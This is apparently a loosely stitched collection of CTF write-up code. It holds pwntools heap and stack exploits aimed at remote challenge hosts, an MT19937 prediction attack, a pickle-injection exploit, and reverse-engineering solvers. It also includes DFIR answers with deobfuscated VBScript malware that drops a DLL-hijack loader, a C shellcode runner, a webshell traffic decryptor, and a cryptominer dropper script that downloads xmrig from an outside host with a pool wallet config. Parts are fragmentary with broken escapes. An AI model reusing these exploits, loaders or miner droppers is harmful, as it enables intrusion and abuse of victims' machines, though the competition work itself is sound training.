        states = list(map(recover, self.randnums))
        states2 = []

        for index in range(50):
            i = 32 + index - 20
            y = (states[i] & 0x80000000) + (states[(i + 1) % 624] & 0x7fffffff)
            z = (y >> 1) ^ states[(i + 397) % 624]

            if y % 2 != 0:
                z = z ^ 0x9908b0df
            states2.append(z)
        
        randnums2 = list(map(extract_number, states2))
        self.new_state1 = sum(randnums2)
        print(f'{self.new_state1 = }')
            

    def gao_2(self):
        self.conn.sendlineafter(b'Enter a number that does not exceed 1500', b'1700')
        leak = []
        for _ in trange(1248):
            Gx = self.conn.recvline().strip()
            Px = self.conn.recvline().strip()
            self.conn.sendline(b'1')
            self.conn.recvuntil(b'Wrong number!!!,Here is your right number ')
            leak.append(int(self.conn.recvline().strip())>>1)
        import sys
        sys.path.append('./MT19937-Symbolic-Execution-and-Solver-master/source')
        from MT19937 import MT19937, MT19937_symbolic
        rng_clone = MT19937(state_from_data = (leak, 24))
        outputs = [rng_clone() for _ in range(624)]
        for _ in range(1248 - 624):
            rng_clone()
        for _ in range(1700 - 1248):
            Gx = self.conn.recvline().strip()
            Px = self.conn.recvline().strip()
            self.conn.sendline(str(rng_clone() >> (32-25)).encode())
        from recoverseed import exact_seed_recovery
        seed = exact_seed_recovery(outputs)
        self.new_state = seed
    
    def gao_3(self):
        import random
        random.seed(self.new_state)
        iv_num = 0
        for _ in range(2000):
            iv_num += random.getrandbits(32)
        self.conn.sendline(str(self.new_state1).encode())
        self.conn.sendline(str(iv_num).encode())
    
    def gao(self):
        self.gao_sha()
        self.gao_1()
        self.gao_new_state1()
        self.gao_2()
        self.gao_3()
        self.conn.interactive()

if __name__ == '__main__':
    g = Gao()
    g.gao()
B = A >> 1
B = B & 0x555
A = A & 0x555
A = A + B
command = '''
B = A >> 1
B = B & 113427455640312821154458202477256070485
A = A & 113427455640312821154458202477256070485
A = A + B
B = A >> 2
B = B & 68056473384187692692674921486353642291
A = A & 68056473384187692692674921486353642291
A = A + B
B = A >> 4
B = B & 20016609818878733144904388672456953615
A = A & 20016609818878733144904388672456953615
A = A + B
A = A % 255
'''
command = ';'.join([expr.replace(' ', '') for expr in command.strip().split('n')]) + ';'
assert command[-1] == ';'
B=A>>1;B=B&113427455640312821154458202477256070485;A=A&113427455640312821154458202477256070485;A=A+B;B=A>>2;B=B&68056473384187692692674921486353642291;A=A&68056473384187692692674921486353642291;A=A+B;B=A>>4;B=B&20016609818878733144904388672456953615;A=A&20016609818878733144904388672456953615;A=A+B;A=A%255;
from pwn import *

    #sh = process("./pwn2")
sh = remote("101.200.139.65", 20527)
    #sh = remote("127.0.0.1", 6666)
def tob(x):
    return str(x).encode()

def add():
    sh.sendlineafter(b'> ', b'1')

def show(idx):
    sh.sendlineafter(b'> ', b'2')
    sh.sendlineafter(b'Index > ', tob(idx))

def edit(idx, data):
    sh.sendlineafter(b'> ', b'3')
    sh.sendlineafter(b'Index > ', tob(idx))
    sh.sendafter(b'Content > ', data)

def remove(idx):
    sh.sendlineafter(b'> ', b'4')
    sh.sendlineafter(b'Index > ', tob(idx))

add()
show(0)
sh.recvuntil(b'Content: ')
arr = eval(sh.recvline().decode())

addrlist = []
addr = 0
for i in range(len(arr)):
    addr += (arr[i] << ((i % 8) * 8))
    if i % 8 == 7:
        addrlist.append(addr)
        addr = 0
for i in range(len(addrlist)):
    print(f"addrlist[{i}] = {hex(addrlist[i])}")

context.terminal = ['tmux', 'splitw', '-h']
    #pause()
    #gdb.attach(sh)
    #context.log_level = 'debug'
edit(0, b'A'*0x20+p64(addrlist[1]-0x2000)+b'A'*0x8+p64(0)+p64(0x2001))
for i in range(0x80):
    log.info(f"i = {i}")
    add()
add()
edit(3, b'A'*0x20+p64(addrlist[1])+b'A'*0x8+p64(0)+p64(0x811)+p64(addrlist[4]+0x18))
sh.recvuntil(b']')
show(0)
sh.recvuntil(b'Content: ')
arr = eval(sh.recvline().decode())

addrlist2 = []
addr = 0
for i in range(len(arr)):
    addr += (arr[i] << ((i % 8) * 8))
    if i % 8 == 7:
        addrlist2.append(addr)
        addr = 0
for i in range(len(addrlist)):
    print(f"addrlist2[{i}] = {hex(addrlist2[i])}")

edit(3, b'A'*0x20+p64(addrlist[1])+b'A'*0x8+p64(0)+p64(0x811)+p64(addrlist2[0]+0x2d40))
show(0)
sh.recvuntil(b'Content: ')
arr = eval(sh.recvline().decode())
addrlist3 = []
addr = 0
for i in range(len(arr)):
    addr += (arr[i] << ((i % 8) * 8))
    if i % 8 == 7:
        addrlist3.append(addr)
        addr = 0
for i in range(len(addrlist)):
    print(f"addrlist3[{i}] = {hex(addrlist3[i])}")

libcbase = addrlist3[0] - 0x472b0
log.success(f"libcbase = {hex(libcbase)}")
edit(3, b'A'*0x20+p64(addrlist[1])+b'A'*0x8+p64(0)+p64(0x811)+p64(addrlist[4]-0x50))
edit(0, p64(libcbase+0x000000000010f75b+1)+p64(libcbase+0x000000000010f75b)+p64(libcbase+0x1cb42f)+p64(libcbase+0x58740))

sh.interactive()
exp = ('11010112001111111100101012211102220100110001001011011000110000010010000110111011100100111100001011111111100100'
       '000010000100100101011000101110010011100100011011011000010010011011101001001110110010101100001101100100000001111'
       '1000101110110011001101110011100011000011000110010000111')
payload = ''
for i in exp:
    payload += f"1n{i}n"

from pwn import *
context.terminal = ['tmux', 'splitw', '-h']

p = process("./expect_number")
p.send(payload.encode())
p.sendline(b"2")
_ = p.recvuntil(exp)
text = u64(p.recv(6) + b"x00x00") - 0x4C60
log.success(f"text base: {hex(text)}")
#_Unwind_RaiseException
p.sendline(b"4")
payload = b'a'*0x20+p64(0x555555559518-0x0000555555554000+text)+p64(0x000055555555651A-0x0000555555554000+text)
    #gdb.attach(p)
p.sendafter(b"favorite number.", payload)
p.interactive()
# gdb.attach(p)
# enc = b'sxrujtv`labiVzbp`vpg|'
# enc = bytearray(enc)
# i = 0
# j = 21

# for _ in range(21):
#     enc[i] ^= j
#     i += 1
#     j -= 1

# print(enc)

from Crypto.Cipher import ARC4

for k in range(0xff):
    enc = [0xC4, 0xEE, 0x3C, 0xBB, 0xE7, 0xFD, 0x67, 0x1D, 0xF8, 0x97, 0x68, 0x9D, 0xB, 0x7F, 0xC7, 0x80, 0xDF, 0xF9, 0x4B, 0xA0, 0x46, 0x91]
    enc[7], enc[11] = enc[11], enc[7]
    enc[12], enc[16] = enc[16], enc[12]
    for i in range(22):
        enc[i] ^= k

    rc4 = ARC4.new(b'6105t3')
    enc = rc4.decrypt(bytes(enc))

    key = [0xDE, 0xAD, 0xBE, 0xEF]
    enc = bytearray(enc)
    for i in range(22):
        enc[i] ^= key[i % 4]

    flag = []
    for i in range(22):
        for t in range(0x7f):
            v3 = (((((t << 7) & 0xff) | (t >> 1)) << 6) ^ 0xC0 | ((((t << 7) | (t >> 1)) & 0xff) >> 2) ^ 0x3B) ^ 0xBE
            v3 &= 0xff
            v4 = ((((((16 * (((32 * v3) | (v3 >> 3)) ^ 0xAD)) | (((((32 * v3) | (v3 >> 3)) ^ 0xAD) & 0xff) >> 4)) ^ 0xDE) & 0xff) >> 5) | (8 * (((16 * (((32 * v3) | (v3 >> 3)) ^ 0xAD)) | (((((32 * v3) | (v3 >> 3)) ^ 0xAD) & 0xff) >> 4)) ^ 0xDE)))
            v4 &= 0xff
            if v4 == enc[i]:
                flag.append(t)
                break

    if len(flag) == 22 and flag[-1] == ord('}'):
        print(bytes(flag))
x = input[0]
tmp_stack = []
check_stack = []
case F2 00:
    x *= x

case F2 03:
    factor = [3, input[1], 6, 82, 6, 2, 13, 17, input[2], 5, 5, 88, input[2], 4, 5, 232, 35, 8, 16]
    x *= factor[现在是第几次调用F2]

case F7:
    f7_arr: [u64] = [input[i] for i in [0, 1, 1, 0, 1, 0, 0, 2, 2, 3, 2, 3, 3, 4, 4]] + [0, 0]
                                       ^ 此数组下标从1开始遍历，等价地，这里已经去掉了第一项
    tmp_stack.push(x)
    x = f7_arr[现在是第几次调用F7]
    
case F0 00 03:
    a2 = tmp_stack.pop()
    a1 = tmp_stack.pop()
    tmp_stack.push(a1 + a2)

case F1 00 03:
    a2 = tmp_stack.pop()
    a1 = tmp_stack.pop()
    tmp_stack.push(a2 - a1)

case F6 03:
    check_stack.push(tmp_stack.pop() % 0x5E2F4391)

case F3 00 03:
    enc = [0x42DB9F06, 0x35368926, 0x509A3978, 0x1EBFA92F, 0x555CC98C]
    x = x ^ check_stack.pop() ^ enc[现在是第几次调用F3]

case F8:
    x == 0
0F2h, 0, 0F2h, 3, 0F7h,
0F2h, 3, 0F2h, 3, 0F7h,
0F2h, 3, 0F7h,
0F2h, 3, 0F7h,
0F2h, 0, 0F2h, 3, 0F7h,
0F2h, 3, 0F7h,
0F2h, 3, 0F7h,
0F2h, 3, 0F2h, 3, 0F7h,
0F2h, 0, 0F2h, 3, 0F7h,
0F2h, 3, 0F7h,
0F2h, 3, 0F2h, 3, 0F7h,
0F2h, 0, 0F2h, 3, 0F7h,
0F2h, 3, 0F7h,
0F2h, 0, 0F2h, 3, 0F7h,
0F2h, 3, 0F7h,
0F2h, 0, 0F2h, 3, 0F7h,

0F0h, 0, 3, 0F1h, 0, 3, 0F6h, 3,
0F0h, 0, 3, 0F1h, 0, 3, 0F6h, 3,
0F0h, 0, 3, 0F1h, 0, 3, 0F6h, 3,
0F0h, 0, 3, 0F0h, 0, 3, 0F6h, 3,
0F0h, 0, 3, 0F0h, 0, 3, 0F1h, 0, 3, 0F6h, 3,

0F7h, 0F3h, 0, 3, 0F3h, 0, 3, 0F3h, 0, 3, 0F3h, 0, 3, 0F3h, 0, 3, 0F8h
import queue

a = [0x61616163, 0x61616164, 0x61616165, 0x61616166, 0x61616167]
tmp_stack = queue.LifoQueue()
check_stack = queue.LifoQueue()

# 0F2h, 0, 0F2h, 3, 0F7h,
tmp_stack.put(a[0] * a[0] * 3)
# 0F2h, 3, 0F2h, 3, 0F7h,
tmp_stack.put(a[0] * a[1] * 6)
# 0F2h, 3, 0F7h,
tmp_stack.put(a[1] * 82)
# 0F2h, 3, 0F7h,
tmp_stack.put(a[1] * 6)
# 0F2h, 0, 0F2h, 3, 0F7h,
tmp_stack.put(a[0] * a[0] * 2)
# 0F2h, 3, 0F7h,
tmp_stack.put(a[1] * 13)
# 0F2h, 3, 0F7h,
tmp_stack.put(a[0] * 17)
# 0F2h, 3, 0F2h, 3, 0F7h,
tmp_stack.put(a[0] * a[2] * 5)
# 0F2h, 0, 0F2h, 3, 0F7h,
tmp_stack.put(a[2] * a[2] * 5)
# 0F2h, 3, 0F7h,
tmp_stack.put(a[2] * 88)
# 0F2h, 3, 0F2h, 3, 0F7h,
tmp_stack.put(a[3] * a[2] * 4)
# 0F2h, 0, 0F2h, 3, 0F7h,
tmp_stack.put(a[2] * a[2] * 5)
# 0F2h, 3, 0F7h,
tmp_stack.put(a[3] * 232)
# 0F2h, 0, 0F2h, 3, 0F7h,
tmp_stack.put(a[3] * a[3] * 35)
# 0F2h, 3, 0F7h,
tmp_stack.put(a[4] * 8)
# 0F2h, 0, 0F2h, 3, 0F7h,
tmp_stack.put(a[4] * a[4] * 16)

# 0F0h, 0, 3, 0F1h, 0, 3, 0F6h, 3,
check_stack.put(tmp_stack.get() + tmp_stack.get() - tmp_stack.get())
# 0F0h, 0, 3, 0F1h, 0, 3, 0F6h, 3,
check_stack.put(tmp_stack.get() + tmp_stack.get() - tmp_stack.get())
# 0F0h, 0, 3, 0F1h, 0, 3, 0F6h, 3,
check_stack.put(tmp_stack.get() + tmp_stack.get() - tmp_stack.get())
# 0F0h, 0, 3, 0F0h, 0, 3, 0F6h, 3,
check_stack.put(tmp_stack.get() + tmp_stack.get() + tmp_stack.get())
# 0F0h, 0, 3, 0F0h, 0, 3, 0F1h, 0, 3, 0F6h, 3,
check_stack.put(tmp_stack.get() + tmp_stack.get() + tmp_stack.get() - tmp_stack.get())

# 0F7h, 0F3h, 0, 3, 0F3h, 0, 3, 0F3h, 0, 3, 0F3h, 0, 3, 0F3h, 0, 3, 0F8h
res = 0
for i in range(5):
    res ^= (check_stack.get() % 0x10000000000000000) % 0x5E2F4391
for i in [0x42DB9F06, 0x35368926, 0x509A3978, 0x1EBFA92F, 0x555CC98C]:
    res ^= i

print(hex(res))
88*a[1] + 6*a[0]*a[1] + -3*a[0]*a[0] mod 0x5E2F4391 == 0x42DB9F06
17*a[0] + 13*a[1] + 2*a[0]*a[0] mod 0x5E2F4391 == 0x35368926
88*a[2] + 5*a[2]*a[2] + -5*a[0]*a[2] mod 0x5E2F4391 == 0x509A3978
232*a[3] + 5*a[2]*a[2] + -4*a[2]*a[3] mod 0x5E2F4391 == 0x1EBFA92F
16*a[4]*a[4] + 8*a[4] + -35*a[3]*a[3] mod 0x5E2F4391 == 0x555CC98C
from Crypto.Util.number import *

p = 0x5E2F4391
Zp = Zmod(p)
PR = PolynomialRing(Zp, names=[f"a_{i}" for i in range(5)])
a = PR.gens()

def resultant(f, g, x):
    return f.sylvester_matrix(g, x).det()

I0 = [
    88*a[1] + 6*a[0]*a[1] + -3*a[0]*a[0] - 0x42DB9F06,
    17*a[0] + 13*a[1] + 2*a[0]*a[0] - 0x35368926,
    88*a[2] + 5*a[2]*a[2] + -5*a[0]*a[2] - 0x509A3978,
    232*a[3] + 5*a[2]*a[2] + -4*a[2]*a[3] - 0x1EBFA92F,
    16*a[4]*a[4] + 8*a[4] + -35*a[3]*a[3] - 0x555CC98C,
]

I = I0[:3]

cur_I = I
for i in range(2):
    nxt_I = []
    for j in range(1, 3-i):
        r = resultant(cur_I[0], cur_I[j], a[i])
        nxt_I.append(r)
    cur_I = nxt_I

PR.<x> = Zp[]
f = cur_I[0](0, 0, x, 0, 0)
sol2 = f.roots()

sols = [set() for i in range(5)]
for a2, alpha2 in sol2:
    a0 = -Zp(88*a2 + 5*a2*a2 - 0x509A3978) / Zp(-5*a2)
    a1 = -Zp(17*a0 + 2*a0*a0 - 0x35368926) / Zp(13)
    a3 = -Zp(5*a2*a2 - 0x1EBFA92F) / Zp(232 - 4 * a2)
    g = 16*x*x + 8*x + -35*a3*a3 - 0x555CC98C
    sol4 = g.roots()
    for a4, alpha4 in sol4:
        a_ = [a0, a1, a2, a3, a4]
        if all (f(*a_) == 0 for f in I0):
            for i in range(5):
                sols[i].add(ZZ(a_[i]))

for i in range(5):
    for x_ in sols[i]:
        t = x_
        while True:
            msg = long_to_bytes(int(t))
            if all(32 < x < 128 for x in msg):
                print(f'Possible a{i}: {msg}')
            t += p
            if t > 2^32:
                break
Possible a0: b'3cfb'
Possible a1: b'af5f'
Possible a2: b'9a18'
Possible a3: b'382a'
Possible a4: b'a23}'
80 04 95 f1 01 00 00 00 00 00 00 43 03 63 63 63 │ . . . . . . . . . . . C . c c c
94 5d 94 28 43 05 4c 75 63 61 73 94 43 06 4a 65 │ . ] . ( C . L u c a s . C . J e
72 65 6d 79 94 43 07 46 65 6c 69 63 69 61 94 43 │ r e m y . C . F e l i c i a . C
04 54 6f 64 64 94 43 07 57 69 6c 6c 69 61 6d 94 │ . T o d d . C . W i l l i a m .
43 05 4a 61 6d 65 73 94 43 07 43 79 6e 74 68 69 │ C . J a m e s . C . C y n t h i
61 94 43 07 56 61 6c 65 72 69 65 94 43 05 44 61 │ a . C . V a l e r i e . C . D a
76 69 64 94 43 0b 43 68 72 69 73 74 6f 70 68 65 │ v i d . C . C h r i s t o p h e
72 94 43 09 45 6c 69 7a 61 62 65 74 68 94 43 05 │ r . C . E l i z a b e t h . C .
41 61 72 6f 6e 94 43 06 56 69 63 74 6f 72 94 43 │ A a r o n . C . V i c t o r . C
04 4a 6f 68 6e 94 43 04 47 61 72 79 94 43 06 48 │ . J o h n . C . G a r y . C . H
61 79 6c 65 79 94 43 04 47 69 6e 61 94 43 07 47 │ a y l e y . C . G i n a . C . G
61 62 72 69 65 6c 94 43 04 4a 6f 73 65 94 43 05 │ a b r i e l . C . J o s e . C .
4a 6f 79 63 65 94 43 05 53 61 72 61 68 94 43 05 │ J o y c e . C . S a r a h . C .
42 72 69 61 6e 94 43 09 43 68 72 69 73 74 69 6e │ B r i a n . C . C h r i s t i n
65 94 43 04 52 79 61 6e 94 43 05 54 79 6c 65 72 │ e . C . R y a n . C . T y l e r
94 43 05 42 72 75 63 65 94 43 06 53 74 61 63 69 │ . C . B r u c e . C . S t a c i
65 94 43 06 59 76 65 74 74 65 94 43 06 44 6f 6e │ e . C . Y v e t t e . C . D o n
61 6c 64 94 43 07 52 69 63 61 72 64 6f 94 43 04 │ a l d . C . R i c a r d o . C .
53 61 72 61 94 43 04 53 65 61 6e 94 43 06 4b 72 │ S a r a . C . S e a n . C . K r
69 73 74 79 94 43 06 4a 6f 73 65 70 68 94 43 07 │ i s t y . C . J o s e p h . C .
43 68 72 69 73 74 79 94 43 06 57 61 6c 74 65 72 │ C h r i s t y . C . W a l t e r
94 43 06 41 6d 61 6e 64 61 94 43 05 50 65 74 65 │ . C . A m a n d a . C . P e t e
72 94 43 04 47 61 69 6c 94 43 06 42 72 65 6e 64 │ r . C . G a i l . C . B r e n d
61 94 43 08 53 61 6d 61 6e 74 68 61 94 43 05 45 │ a . C . S a m a n t h a . C . E
6d 69 6c 79 94 43 06 41 73 68 6c 65 79 94 43 05 │ m i l y . C . A s h l e y . C .
4b 65 76 69 6e 94 43 07 52 69 63 68 61 72 64 94 │ K e v i n . C . R i c h a r d .
43 07 43 68 61 72 6c 65 73 94 43 05 54 61 6d 6d │ C . C h a r l e s . C . T a m m
79 94 43 04 45 72 69 6e 94 43 05 4b 65 6c 6c 79 │ y . C . E r i n . C . K e l l y
94 43 05 53 68 65 72 69 94 68 00 65 8c 2a 66 6c │ . C . S h e r i . h . e . * f l
61 67 7b 63 62 30 61 62 35 35 31 2d 34 61 37 66 │ a g { c b 0 a b 5 5 1 - 4 a 7 f
2d 34 30 33 65 2d 38 62 62 37 2d 38 63 64 36 61 │ - 4 0 3 e - 8 b b 7 - 8 c d 6 a
37 39 37 65 39 63 32 7d 94 87 94 2e │ 7 9 7 e 9 c 2 } . . . .
80 04 95 e1 02 00 00 00 00 00 00 42 y1 y2 y3 y4 xx xx xx xx xx xx
 B^^ ----len---- =======name======
from pwn import *
from struct import pack

r = remote('47.94.195.201', 22929)

r.recvuntil(b'players: [')
names = r.recvuntil(b']!n', drop=True)
names = [ name.removeprefix(b'b'').removesuffix(b''') for name in names.split(b', ') ]
name_len = sum([ len(name) + 3 for name in names ])

FLAG_LEN = len('flag{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}')
NAME_PRE = b'B' + pack(' icq
(1/13) 攻击者的邮箱是什么? (注意:
MD5(攻击者邮箱),以cyberchef的为准) 示例:
9b04d152845ec0a378394003c96da594
请输入你的答案 > a8cd5b4ba47e185d4a69a583fde84da5
正确✅!
(2/13) 攻击者所投放的文件md5是什么? (注意:
以md5sum的结果为准) 示例:
33ec9f546665aec46947dca16646d48e
请输入你的答案 > f436b02020fa59f3f71e0b6dcac6c7d3
正确✅!
(3/13) 攻击者所使用的攻击载荷后缀是什么？ 示例:
lnk
请输入你的答案 > msc
正确✅!
(4/13) 攻击者所投放样本的初始执行语句在该攻击载荷文件的第几行? 示例:20
请输入你的答案 > 97
正确✅!
(5/13) 经过初始执行后,攻击者所加载的第二部分载荷所使用的语言是什么? 示例:
javascript
请输入你的答案 > VBScript
正确✅!
(6/13) 攻击者所进行的第二部分载荷其将黑DLL存在了什么地方? (注意:
需要提供完成的解混淆后的第二部分载荷s*******s函数的参数) 提交需要MD5(参数内容) 以Cyberchef结果为准 示例:
9b04d152845ec0a378394003c96da594
请输入你的答案 > d2fabdcc28074462ac2379101836c938
正确✅!
(7/13) 攻击者使用的这个白EXE加载黑DLL的手法所对应的MITRE ATT&CK ID是什么? (注意:
请注意示例的提示提交大类即可不需要细化到分项) 示例: T1000
请输入你的答案 > T1574
正确✅!
(8/13) 攻击者所使用的黑DLL劫持了原始DLL的哪个函数? 示例: main
请输入你的答案 > curl_easy_init
正确✅!
(9/13) 攻击者所使用的黑DLL解密下一阶段载荷所使用的算法是什么? 示例:
chacha20
请输入你的答案 > RC4
正确✅!
(10/13) 攻击者所使用的下一阶段载荷的回连C2是什么? (注意:
需要提供ip地址:
端口的形式) 示例:
127.0.0.1:
5100
请输入你的答案 > 192.168.57.119:
6000
正确✅!
(11/13) 攻击者所使用最终阶段载荷所使用的加密算法是什么? 示例:
DES
请输入你的答案 > AES
正确✅!
(12/13) 攻击者所使用最终阶段载荷所使用的密钥的MD5是什么? (注意:
MD5(密钥内容),以cyberchef的为准) 示例:
9b04d152845ec0a378394003c96da594
请输入你的答案 > a524c43df3063c33cfd72e2bf1fd32f6
正确✅!
(13/13) 攻击者使用了什么家族的C2? 示例:
PoshC2
请输入你的答案 > OrcaC2
正确✅!
恭喜你完成了所有任务,这是你的flag 🚩 -->
import re

with open("1.vbs", "r") as f:
    c = f.read()

matches = re.findall("Chr((.*?))", c)
for i in matches:
    x = i.replace('"', '')
    x = x.replace('/', '//')
    try:
        x = eval(x)
        c = c.replace(f"Chr({i})", chr(x))
    
except:
        pass

print(c)
OMxa=51734e8e7ec47ec753c252a07b2c516b5c4a201c5f3a7f51676f201d516856fd7f517edc5b895168631162188d5b7684901a77e5ff08003100316708003265e581f3003365e54e3e884c7ebf4e0a8d5bff09002e007000640066
 Set AgUvcCuHzzbl=CreateObject(WScript.Shell)
 Set DfAV40y=CreateObject(Scripting.FileSystemObject)
 O8B1OrkTW=AgUvcCuHzzbl.ExpandEnvironmentStrings(%ProgramFiles%)
 P59b6scR2TD9=O8B1OrkTW Cloudflare
 DfAV40y.CreateFolder(P59b6scR2TD9)
 gwqhhV=P59b6scR2TD9 GUP.exe
 JJNe=P59b6scR2TD9 libcurl.dll
 For i=1 to Len(OMxa) Step 4
 FRURX=FRURX ChrW(CLng(H Mid(OMxa,i,4)))
 Next
 Mw7U=DfAV40y.GetSpecialFolder(2) FRURX
 Set aZPHxtz4=RTcxFmy.selectNodes( /MMC_ConsoleFile/BinaryStorage/Binary[@Name='CONSOLE_TREE'] )
 rqsgO2mBfu=aZPHxtz4(0).text
 UoLAunW=Xk7fbp8v(rqsgO2mBfu)
 Dim jXnaWeLQ12
 Set jXnaWeLQ12=CreateObject(ADODB.Stream)
 jXnaWeLQ12.Type=1
 jXnaWeLQ12.Open
 jXnaWeLQ12.Write UoLAunW
 jXnaWeLQ12.SaveToFile Mw7U,2
 AgUvcCuHzzbl.run Mw7U ,1,false
 Set aZPHxtz4=RTcxFmy.selectNodes( /MMC_ConsoleFile/BinaryStorage/Binary[@Name='CONSOLE_MENU'] )
 Ze1C=aZPHxtz4(0).text
 Set aZPHxtz4 = RTcxFmy.selectNodes( /MMC_ConsoleFile/BinaryStorage/Binary[@Name='CONSOLE_PANE'] )
 JozMh9jg=aZPHxtz4(0).text
 AnZUOdqFuMEw=Xk7fbp8v(Ze1C)
 s4fr2y4Q7lvQ=Xk7fbp8v(JozMh9jg)
 Dim cHh5wARUext
 Set cHh5wARUext=CreateObject(ADODB.Stream)
 cHh5wARUext.Type=1
 cHh5wARUext.Open
 cHh5wARUext.Write AnZUOdqFuMEw
 cHh5wARUext.SaveToFile gwqhhV,2
 Dim BKzG1ldRw7
 Set BKzG1ldRw7=CreateObject(ADODB.Stream)
 BKzG1ldRw7.Type=1
 BKzG1ldRw7.Open
 BKzG1ldRw7.Write s4fr2y4Q7lvQ
 BKzG1ldRw7.SaveToFile JJNe,2
 AgUvcCuHzzbl.run gwqhhV t 8.8.8.8,0,false
 End Function
    #include <windows.h>
    #include <stdio.h>

typedef int (*curl_easy_init_func)();

int main() {
    HINSTANCE hinstLib;
    curl_easy_init_func curl_easy_init;
    BOOL fFreeResult;

    // 加载DLL
    hinstLib = LoadLibrary(TEXT("CONSOLE_PANE.dll"));
    if (hinstLib != NULL) {
        // 获取函数地址
        curl_easy_init = (curl_easy_init_func)GetProcAddress(hinstLib, "curl_easy_init");

        // 如果函数地址获取成功，调用函数
        if (NULL != curl_easy_init) {
            int result = curl_easy_init();
            printf("curl_easy_init returned: %dn", result);
        } else {
            printf("Failed to find the function curl_easy_init.n");
        }

        // 释放DLL模块
        fFreeResult = FreeLibrary(hinstLib);
    } else {
        printf("Failed to load the DLL.n");
    }

    return 0;
}
    #include <stdio.h>
    #include <stdlib.h>
    #include <windows.h>

// 定义一个函数指针类型
typedef void (*func_ptr)();

int main(int argc, char *argv[]) {
    // 打开文件
    HANDLE hFile = CreateFile("1730391917.bin", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "Could not open file (error %d)n", GetLastError());
        return 1;
    }

    // 获取文件大小
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        fprintf(stderr, "Could not get file size (error %d)n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }

    // 分配可执行内存
    void *mem = VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (mem == NULL) {
        fprintf(stderr, "Could not allocate memory (error %d)n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }

    // 读取文件内容到内存
    DWORD bytesRead;
    if (!ReadFile(hFile, mem, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        fprintf(stderr, "Could not read file (error %d)n", GetLastError());
        VirtualFree(mem, 0, MEM_RELEASE);
        CloseHandle(hFile);
        return 1;
    }

    // 关闭文件
    CloseHandle(hFile);

    // 将内存区域转换为函数指针并调用
    func_ptr func = (func_ptr)mem;
    func();

    // 释放内存
    VirtualFree(mem, 0, MEM_RELEASE);

    return 0;
}
欢迎来到Master of DFIR - ☕ ,我们需要帮助你调查以下任务.并且提交这些任务的正确答案,我们将会给你flag🤔
需要输入Team Token即可开始
Team token > icq
(1/9) 受害者主机名是什么? 示例:
DESKTOP-J6QZVBD
请输入你的答案 > DESKTOP-28DGVAU
正确✅!
(2/9) 控制端ClientId是多少? 示例:
c723d01b-5dc1-2601
请输入你的答案 > a55330f4-83c2-4081
正确✅!
(3/9) 攻击者下载的文件的保存名是什么？ 示例:
flag.txt
请输入你的答案 > history
正确✅!
(4/9) tomcat的用户名和密码是多少? 示例:
admin:
admin
请输入你的答案 > tomcat:
beautiful
正确✅!
(5/9) 攻击者上传的文件名? 示例:
flag.txt
请输入你的答案 > help.war
正确✅!
(6/9) 黑客使用webshell管理工具是什么? (注意:
全小写) 示例:
antsword
请输入你的答案 > behinder
正确✅!
(7/9) 攻击者通过webshell上传的恶意文件是什么? 示例:
malware.exe
请输入你的答案 > e.ps1
正确✅!
(8/9) 恶意脚本设置的计划任务叫什么? 示例: Miner
请输入你的答案 > Update service for Windows Service
正确✅!
(9/9) 该挖矿程序回连的矿池域名是什么? 示例:
www.baidu.com
请输入你的答案 > auto.skypool.xyz
正确✅!
恭喜你完成了所有任务,这是你的flag 🚩 -->
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.File;
import java.io.FileOutputStream;
import java.nio.charset.StandardCharsets;
import java.util.zip.Inflater;

public class Main {
    public static void main(String[] args) throws Exception {
        byte[] data = java.util.Base64.getDecoder().decode(args[0]);
        for (int i = 0; i < data.length; i++) {
            data[i] = (byte) (data[i] ^ "82ca9b43c1b8ef8c".getBytes()[(i + 1) & 15]);
        }
        byte[] raw = "b42e327feb5d923b".getBytes(StandardCharsets.UTF_8);
        SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(2, skeySpec);
        byte[] decrypted = cipher.doFinal(data);
        byte[] inflater_output = new byte[1];
        Inflater inflater = new Inflater();
        inflater.setInput(decrypted);
        File file = new File(args[1]);
        FileOutputStream fileOutputStream = new FileOutputStream(file);
        while (inflater.inflate(inflater_output) != 0){
             fileOutputStream.write(inflater_output[i]);
        }
        fileOutputStream.write(inflater_output[i]);
        fileOutputStream.close();
    }
}
import base64
import subprocess
import json
import re

def decrypt2(_data, cnt):
    try:
        _ = subprocess.check_output(['java', 'Main', _data[:-1], f'{cnt}.class'])
    
except:
        ...

def decrypt(_data, cnt):
    _ = subprocess.check_output(['java', 'Main', _data[:-1], f'{cnt}.dmp'])
    j = json.load(open(f'{cnt}.dmp', "r"))
    msg = base64.b64decode(j['msg']).decode('utf-8')
    try:
            msg = json.loads(msg)
            for i in msg:
                for k in i.keys():
                    i[k] = base64.b64decode(i[k]).decode('utf-8')
            return msg
    
except:
        return msg

f = open("res.txt", "r").read()
a = re.findall(r"([0-9A-Za-z/+=]+?)HTTP/1.1 200 ", f)
x = open("back.txt", "w")
x.write('n'.join(a))
x.close()

a = open("back.txt", "r").readlines()[1:]

c = 100
for x in range(len(a)):
    c += 1
    print(decrypt2(a[x], c))
成功: 成功创建计划任务 "Update service for Windows Service"。
$ne = $MyInvocation.MyCommand.Path
$miner_url = "http://192.168.100.131:
8000/xmrig.exe"
$miner_url_backup = "http://192.168.100.131:
8000/xmrig.exe"
$miner_size = 6412800 
$miner_name = "sys_update"
$miner_cfg_url = "http://192.168.100.131:
8000/config.json"
$miner_cfg_url_backup = "http://192.168.100.131:
8000/config.json"
$miner_cfg_size = 3714
$miner_cfg_name = "config.json"

$miner_path = "$env:
TMPsys_update.exe"
$miner_cfg_path = "$env:
TMPconfig.json"
$payload_path = "$env:
TMPupdate.ps1"
"algo": null,
      "coin": null,
      "url": "auto.skypool.xyz:
4444",
      "user": "48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD",
      "pass": "x",
